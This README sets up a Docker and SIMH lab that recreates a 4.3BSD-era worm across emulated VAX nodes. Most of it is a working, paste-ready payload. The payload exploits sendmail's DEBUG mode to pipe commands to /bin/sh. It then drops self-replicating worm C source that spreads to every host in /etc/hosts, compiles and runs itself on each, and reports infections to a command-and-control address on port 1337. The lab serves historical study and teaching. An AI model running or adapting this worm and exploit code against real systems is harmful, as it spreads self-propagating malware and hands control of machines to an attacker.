# 🕵️ VAX Cluster Worm Lab

Functional recreation of a 4.3BSD worm propagation environment using SIMH and Docker.

## 🚀 Quick Execution

1.  **Build & Up:**

    ```bash
    docker build -t ye-olde-bsd .
    docker-compose up -d
    ```

2.  **Visualize:**
    On your host machine, open your browser and go to:
    **`http://localhost:8000`**
    _(Ensure `python3 -m http.server 8000` is running in the `/www` directory)._

3.  **Trigger Infection:**
    Attach to the first node and paste the payload provided below.
    ```bash
    docker attach node-1
    ```

## 💉 Infection Payload (The Exploit)

Paste this entire block into the `node-1` terminal to initiate the worm. This leverages the `sendmail` DEBUG vulnerability to drop, compile, and execute the worm source.

```bash
telnet node-2 25
DEBUG
mail from:<attacker>
rcpt to:<"| sed '1,/^\$/d' | /bin/sh">
data

cd /tmp
cat > worm_final.c <<'EOF'
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>

#define C2_SERVER "172.20.0.11"
#define C2_PORT 1337

/* Signals C2 Tracker */
beacon(ip) char *ip; {
    int sock; struct sockaddr_in server;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(C2_SERVER);
        server.sin_port = htons(C2_PORT);
        if (connect(sock, &server, sizeof(server)) >= 0) {
            write(sock, "Infecting: ", 11);
            write(sock, ip, strlen(ip)); write(sock, "\n", 1);
        }
        close(sock);
    }
}

/* Core propagation logic */
infect(target_ip) char *target_ip; {
    int sock; struct sockaddr_in target; char buf[1024]; FILE *self; char line[128];
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    target.sin_family = AF_INET;
    target.sin_addr.s_addr = inet_addr(target_ip);
    target.sin_port = htons(25);
    if (connect(sock, &target, sizeof(target)) < 0) { close(sock); return; }
    sleep(2); read(sock, buf, 1023);

    /* SMTP Exploit Phase */
    write(sock, "DEBUG\r\n", 7); sleep(1);
    write(sock, "mail from:<root>\r\n", 18); sleep(1);
    write(sock, "rcpt to:<\"| /bin/sed '1,/^$/d' | /bin/sh\">\r\n", 44); sleep(1);
    write(sock, "DATA\r\n", 6); sleep(1);
    write(sock, "\r\n", 2);

    /* Replicate Source */
    write(sock, "cd /tmp\n", 8);
    write(sock, "cat > worm_final.c << 'SHUTDOWN'\n", 33);
    self = fopen("worm_final.c", "r");
    if (self != NULL) {
        while (fgets(line, 128, self) != NULL) { write(sock, line, strlen(line)); }
        fclose(self);
    }
    write(sock, "SHUTDOWN\n", 9);

    /* Compile and Execute on Target */
    write(sock, "/etc/ping 172.20.0.10 64 2\n", 27);
    write(sock, "/bin/cc -o worm_final worm_final.c\n", 35);
    write(sock, "./worm_final &\n", 15);

    /* SMTP Cleanup */
    write(sock, ".\r\n", 3); sleep(1);
    write(sock, "QUIT\r\n", 6); close(sock);
}

main() {
    FILE *fp; char line[128]; char ip[64];
    fp = fopen("/etc/hosts", "r");
    if (fp == NULL) exit(1);
    while (fgets(line, 128, fp) != NULL) {
        if (line[0] == '#' || line[0] == '\n' || line[0] == ' ') continue;
        if (sscanf(line, "%s", ip) != 1) continue;
        if (strcmp(ip, "127.0.0.1") == 0 || strcmp(ip, "10.0.2.15") == 0) continue;
        beacon(ip); infect(ip);
    }
    fclose(fp); exit(0);
}
EOF
/bin/cc -o worm_final worm_final.c
./worm_final
/etc/ping 172.20.0.10 64 2
.
QUIT
```

⚙️ Configuration
Neighbor Setup: Automated via identity.exp at first boot. It pulls NEIGHBOR_IP and NEIGHBOR_NAME from the docker-compose.yml environment variables and injects them into /etc/hosts.

Network: Nodes are isolated on the net_alpha Docker bridge. SIMH attaches to the container's eth0 interface via the boot.ini configuration.

Monitoring: tracker.sh runs tcpdump on the host to capture SMTP commands, ICMP pings, and C2 beacons ("Infecting: ...") for the real-time web dashboard.
